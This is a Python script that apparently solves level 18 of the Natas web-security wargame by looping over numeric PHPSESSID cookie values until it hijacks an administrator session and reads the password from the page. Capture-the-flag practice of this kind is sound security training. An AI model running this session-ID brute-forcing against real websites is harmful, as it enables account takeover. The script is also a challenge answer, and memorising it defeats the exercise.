from config import password_length, natas18_max_session_id
from utils import get_level_url, get_request_object, store_secret_and_print_message

level_number = 18


def get_secret(debug=False):
    for i in range(1, natas18_max_session_id + 1):
        if debug:
            print(f"checking: {i}")

        req = get_request_object(level_number)
        result = req.post(get_level_url(level_number), cookies={"PHPSESSID": str(i)})
        text = result.text
        search = "Password:"

        if search in text:
            start_index = text.find(search) + len(search) + 1
            return text[start_index: start_index + password_length]

    return ""


secret = get_secret(debug=True)
store_secret_and_print_message(level_number, secret)
